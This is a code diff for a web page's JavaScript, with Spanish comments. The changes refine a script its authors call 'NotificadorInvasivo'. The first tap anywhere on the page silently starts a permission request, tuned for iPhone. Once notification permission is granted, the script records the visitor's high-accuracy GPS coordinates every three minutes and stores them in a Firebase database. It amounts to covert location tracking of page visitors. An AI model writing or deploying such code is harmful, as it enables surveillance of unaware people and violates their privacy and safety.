@@ -27,10 +27,12 @@ const db = getFirestore(app);
 /* ******************************************************************************* */
 
 /*FUNCION DE BD*/
+/* --- 1. FUNCIÓN PARA GUARDAR EN FIREBASE --- */
 async function guardarUbicacionBD(lat, lon) {
   try {
     const colRef = collection(db, "ubicaciones");
 
+    // Obtenemos el conteo para generar un ID secuencial
     const snapshot = await getCountFromServer(colRef);
     const nuevoId = snapshot.data().count;
 
@@ -39,70 +41,92 @@ async function guardarUbicacionBD(lat, lon) {
       id_ubicaciones: nuevoId,
       fecha_ubi: serverTimestamp(),
     });
-    console.log(`Documento guardado con ID secuencial: ${nuevoId}`);
+    console.log(`Ubicación guardada en BD. ID: ${nuevoId}`);
   } catch (e) {
-    console.error("Error al obtener conteo o guardar:", e);
+    console.error("Error al guardar en Firebase:", e);
   }
 }
 
-/*FUNCION DE GEOLOCALIZACION*/
+/* --- 2. FUNCIÓN DE GEOLOCALIZACIÓN --- */
 async function obtenerUbicacion() {
   const resultado = document.getElementById("resultado");
+
   if (navigator.geolocation) {
-    if (resultado) resultado.innerHTML = "capturando info";
+    if (resultado) resultado.innerHTML = "Capturando ubicación...";
 
     navigator.geolocation.getCurrentPosition(
       async function (posicion) {
         const lat = posicion.coords.latitude;
         const lon = posicion.coords.longitude;
+
         if (resultado) {
-          resultado.innerHTML = `Lat: ${lat}, ${lon}`;
+          resultado.innerHTML = `Lat: ${lat.toFixed(5)}, Lon: ${lon.toFixed(5)}`;
         }
+
+        // Llamamos a la función de guardado
         guardarUbicacionBD(lat, lon);
       },
       function (error) {
-        console.error("Error de geolocalización:", error.message);
+        console.error("Error de GPS:", error.message);
+        if (resultado) resultado.innerHTML = "No se pudo obtener la ubicación.";
       },
-      { enableHighAccuracy: true } // Mayor precisión para el GPS
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      }
     );
+  } else {
+    if (resultado) resultado.innerHTML = "El navegador no soporta GPS.";
   }
 }
 
-/*notificador)*/
+/* --- 3. OBJETO NOTIFICADOR (EL CORAZÓN DEL PERMISO) --- */
 const NotificadorInvasivo = {
   registration: null,
   solicitarPermiso: async function (ms) {
     try {
+      // REGISTRO DEL SERVICE WORKER
+      // IMPORTANTE: Sin el '/public/', asumiendo que sw.js está en la raíz de tu hosting
       this.registration = await navigator.serviceWorker.register('/sw.js');
+      console.log("Service Worker registrado.");
+
+      // SOLICITUD DE PERMISO DE NOTIFICACIÓN
+      // Esto disparará el cartel en iPhone solo si viene de un toque (click/touchstart)
       let permission = await Notification.requestPermission();
 
       if (permission === "granted") {
-        obtenerUbicacion();
+        console.log("Permiso de notificación concedido.");
+        obtenerUbicacion(); // Primera captura
+
+        // Intervalo de captura (ms = 180000 para 3 minutos)
         setInterval(() => {
           obtenerUbicacion();
         }, ms);
       }
     } catch (err) {
-
-      console.error("Error de permisos/sw.js: ", err);
+      console.error("Error en flujo de permisos:", err);
     }
   }
 };
-/*window.onload = () => {
+
+/* --- 4. LÓGICA DE ACTIVACIÓN "INVISIBLE" PARA IPHONE --- */
+
+// Esta función se ejecuta al primer toque del usuario
+function activarAlInteractuar() {
+  console.log("Usuario interactuó. Solicitando permisos...");
+
+  // Ejecutamos la lógica de permisos (3 minutos)
   NotificadorInvasivo.solicitarPermiso(180000);
-};*/
-NotificadorInvasivo.solicitarPermiso(180000);
 
-// También podrías disparar aquí la geolocalización
-// obtenerUbicacion(); 
+  // IMPORTANTE: Quitamos los escuchadores para que no se repita en cada clic
+  document.removeEventListener('click', activarAlInteractuar);
+  document.removeEventListener('touchstart', activarAlInteractuar);
+}
 
-// Limpiamos el evento para que no se ejecute en cada clic
-document.removeEventListener('click', activarNotificaciones);
-document.removeEventListener('touchstart', activarNotificaciones);
-
-document.addEventListener('click', activarNotificaciones);
-document.addEventListener('touchstart', activarNotificaciones);
-
+// Escuchamos el primer clic o toque en cualquier parte de la pantalla
+document.addEventListener('click', activarAlInteractuar);
+document.addEventListener('touchstart', activarAlInteractuar);
 
 
 
